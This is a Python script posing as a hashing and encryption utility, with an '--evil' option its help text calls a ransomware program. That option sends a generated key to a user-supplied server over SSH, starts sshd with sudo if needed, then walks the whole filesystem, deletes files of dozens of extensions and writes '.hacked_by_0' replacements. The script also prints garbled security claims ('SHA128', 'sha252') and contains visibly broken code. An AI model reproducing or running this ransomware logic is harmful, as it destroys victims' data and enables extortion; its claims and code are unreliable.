#! /usr/bin/python3


import subprocess
import optparse
from cryptography import fernet
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import os 
from Crypto.Hash import SHA
from Crypto.Hash import SHA512
import time
import bcrypt
import paramiko
import random

class Thing:
    def __init__(self):
        values = self.get_arguments()
        self.values = values 
        self.encrypt_file = None
        self.encrypt_word = None
        self.key_for_file = None
        self.key_for_word = None
        if self.values.mode == "encrypt" and self.values.aes:
            self.aes_encryptor()
        elif self.values.mode == "decrypt" and self.values.aes:
            self.aes_decryptor()
        elif self.values.mode == "encrypt" and self.values.sha:
            self.sha_hasher()
        elif self.values.salt:
            self.hash_with_salt()
        elif self.values.evil:
            self.evil_function()


    def get_arguments(self):
        parser = optparse.OptionParser()
        parser.add_option("-a","--aes",dest="aes",help="Choose this for AES symmetric encryption(key is 32 bytes long)")
        parser.add_option("-c","--chacha",dest="chacha",help="Chooce this if you want to encrypt something with chacha algo")
        parser.add_option("-s","--sha",dest="sha",help="Choose this for SHA hash algorithm(SHA-Created by NSA)")
        parser.add_option("-e","--evil",dest="evil",help="Choose this to start ramson_ware program")
        parser.add_option("-m","--mode",dest="mode",help="Type mode + encrypt or decrypt")
        parser.add_option("-t","--salt",dest="salt",help="Hash function with salt!!(Type salt + yes)")
        user_values = parser.parse_args()[0]
        if not user_values.aes and not user_values.chacha and not user_values.sha and not user_values.evil and not user_values.salt:
            parser.error("Choose 1 from this 4 options,type --help for more info")
        else:
            return user_values


    def set_env(self,the_key):
        print("Setting the variables...")
        time.sleep(2)
        os.environ["KEY"] = the_key.decode()
        if os.getenv("KEY"):
            print("Done key stored at KEY env var")
            print(os.getenv("KEY"))
        else:
            print("Error")
            print("Exiting..")
            os.sys.exit(0)

    def aes_encryptor(self):
        check_value = ""
        print("Starting the encryption process..")
        time.sleep(2)
        print("File or word encryption")
        print("Type file or word")  
        user_value = input()
        if user_value != "file" or user_value != "word":
            while(True):
                print("Type again...")
                print("Type file or word")
                user_value = input() 
                if user_value == "file" or user_value == "word":
                    break 
                else:
                    continue
        if user_value == "file":
            self.encrypt_file = user_value
            print("Type the path of your file")
            path_file = input()
            try:
                with open(path_file,"r") as file:
                    file.read()
            except Exception:
                print("File path does not exist!!")
            print("Continue...")
            print("Reading file content...")
            time.sleep(3)
            with open(path_file,"r") as file:
                content = file.read()
            print("Generating key...")
            key = fernet.Fernet.generate_key()
            self.key_for_file = key
            myfernet = fernet.Fernet(key)
            file_path = file.path("/")[-1]
            new_file = "encrypted_" + file_path 
            content = bytes(content)
            with open(new_file,"wb") as file:
                file.write(content)
            print("Done .....")
            print("Key will be stored as env variable in your system..")
            self.set_env(self.key_for_file)
            print("Exiting....")
            time.sleep(2)
        elif user_value == "word":
            self.encrypt_word = user_value
            print("Type the word you want to encrypt...")
            word = input()
            print("Generating key..")
            time.sleep(3)            
            key = fernet.Fernet.generate_key()
            myfernet = fernet.Fernet(key)
            self.key_for_word = key
            word_encrypted = myfernet.encrypt(word.encode())
            print("Encrypted!!! >> " + word_encrypted.decode())
            print("Keys will be saved at >> KEY system var")
            self.set_env(self.key_for_word)
            print("Done..")
            print("Exiting..")
            time.sleep(2)
        
    def aes_decryptor(self):
        print("Starting process for decryption..")
        key = input("KEY:")
        myfernet = fernet.Fernet(key.encode())
        print("Decrypt word or file?")
        print("Type word of file")
        answer = input()
        if answer == "file":
            print("Pass me the file_path:")
            file_path = input()
            with open(file_path,"r") as file:
                content = file.read()
            decrypted_content = myfernet.decrypt(bytes(content))
            with open("decrypted_file","wb") as file:
                file.write(bytes(decrypted_content))
            print("Done")
            print("Exiting...")
            time.sleep(3)
        elif answer == "word":
            word = input("Word:")
            if key != None:
                print("Starting decryption...")
                myfernet = fernet.Fernet()
                new_word = myfernet.decrypt(word.encode())
                print(new_word.decode())
        elif answer != "word" or answer!="file":
            print("Error")
            print("Exiting...")
            time.sleep(2)
    
    def sha_hasher(self):
        print("Little info:SHA is created by nsa after collision attacks with some algorithms")
        print("SHA256,and SHA128 can be cracked without the salt..!")
        print("Linkedin attackers broke sha252 algorithm!!")
        print("After snowden reveals nsa records,some scientists discover that the diffie-helman algorithm is vurnelable")
        print("The created some broken diffie-helman keys,and they stated that with 3000cpu power broke the algo in 2 months")
        print("Diffie-helman is considered one of the most strong encryption algorithms(1048bit key)")
        print("They told that with some thousends of dollars someone can crack 1/3 wordwide connections!!")
        print("Think that nsa budget is around 10-12 billion dollars")
        time.sleep(10)
        print("This hash is not secure without salt")
        print("Starting...")
        print("Type the value you want to hash...")
        word = input()
        print("SHA128 OR SHA512")
        print("Type sha or sha512")
        algorithm = input()
        if algorithm == "sha":
            print("Starting...") 
            sha = SHA.new()
            sha.update(word)
            print("Hashed >> " + sha.digest())
        elif algorithm == "sha512":
            print("Starting...")
            time.sleep(2)
            sha512 = SHA512.new()
            sha512 = SHA512.update(word)
            print("Hashed >> " + sha512.digest())
        else:
            print("Error value..")
            print("Exiting...")
            time.sleep(2)
            os.sys.exit(0)

    def hash_with_salt(self):
        print("Initializing module...")
        time.sleep(2)
        print("Type the value you want to hash!!")
        word = input()
        word = word.encode()
        salt = bcrypt.gensalt()
        result = bcrypt.hashpw(salt=salt,password=word)
        print("Hashed >> " + result.decode())

    def evil_function(self):
        print("Starting evil mode...")
        time.sleep(2)
        key = fernet.Fernet.generate_key()
        print("Key generated...")
        print("Key will be stored in your evil server...")
        print("Keys will be transfered via encrypted communication...")
        print("Type the hostname of your server:")
        the_hostname = input()
        print("Type your username(system):")
        the_username = input()
        print("Type your password(system):")
        the_password = input()
        print("Starting...")
        time.sleep(2)
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(policy=paramiko.client.AutoAddPolicy())
        try:
            client.connect(hostname=the_hostname,username=the_username,password=the_password)
            ssh_stdin,ssh_stdout,ssh_stderr = client.exec_command("touch key")
            command = "echo " + str(key) +  " > " + "key"
            ssh_stdin,ssh_stdout,ssh_stderr = client.exec_command(command.encode())
            client.close()
        #except Exception:
            #print("Wrong username or password....")
            #print("Exiting...")
            #time.sleep(2)
            #os.sys.exit(0)
        except paramiko.ssh_exception.NoValidConnectionsError:
            print("Ssh port is closed...")
            print("Starting ssh service plz wait...")
            time.sleep(3)
            print("Checking your system...")
            check_os = os.uname()
            if "windows" in check_os:
                print("Unsupported operating system..")
                print("Exiting..")
                time.sleep(2)
                os.sys.exit(0)
            else:
                signal_to_system = subprocess.call("sudo systemctl start ssh",shell=True)
                if signal_to_system == 0:
                    print("Service started..")
                    print("Sending the key...")
                    time.sleep(2)
                    client.connect(hostname=the_hostname,username=the_username,password=the_password)
                    ssh_stdin,ssh_stdout,ssh_stderr = client.exec_command("touch KEY")
                    ssh_stdin,ssh_stdout,ssh_stderr = client.exec_command("echo " + str(key) + " > " + "KEY")
                    client.close()       
        print("Starting whole file system encryption....")
        print("Please wait..")
        time.sleep(2)
        fn = fernet.Fernet(key)           
        extensions = [
            ".txt",".py",".cpp",".c",".java",".go",".wav",".mp3",".mp4",".wav",".pdf",".docx",
            ".doc",".bat",".out",".html",".ppt",".pptx",".jpeg",".png",".exe",".css",".js",".jar",".tar",
            ".zip",".amg",".asm",".json",".xml",".wma",".arj",".tar.gz",".iso",".db",".log",".bmp",".cgi",
            ".dll",".ico",".sys",".bak"
        ]
       
       
        for _,_,files in os.walk("/"):
            for file in files:
                file_extension = file.split(".")[-1]
                file_extension = "." + file_extension
                if file_extension in extensions:
                    with open(path + file,"rb") as fi:
                        encrypted_content = fn.encrypt(fi.read())
        for _,_,files in os.walk("/"):
            for file in files:
                filename = file.split(".")[0]
                ext = file.split(".")[-1]
                ext = "." + ext
                if ext in extensions:
                    os.remove(path+file)
                    with open(path + filename + "." + "hacked_by_0","wb") as myfile:
                        myfile.write(encrypted_content)

           

thing = Thing()


